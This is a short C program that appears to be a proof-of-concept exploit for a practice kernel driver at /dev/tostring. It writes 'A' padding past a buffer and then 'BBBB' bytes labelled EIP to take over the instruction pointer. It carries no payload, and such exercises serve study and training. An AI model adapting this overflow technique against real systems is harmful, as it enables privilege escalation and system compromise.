#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

int main()
{
    char padding[9] = "AAAAAAAA";
    char EIP[5] = "BBBB";
    int fd = open("/dev/tostring", O_RDWR);

    for (int i = 0; i < 0x40; ++i) {
        write(fd, padding, sizeof(padding)-1);
    }
    write(fd, EIP, sizeof(EIP)-1);

    

    return 0;
}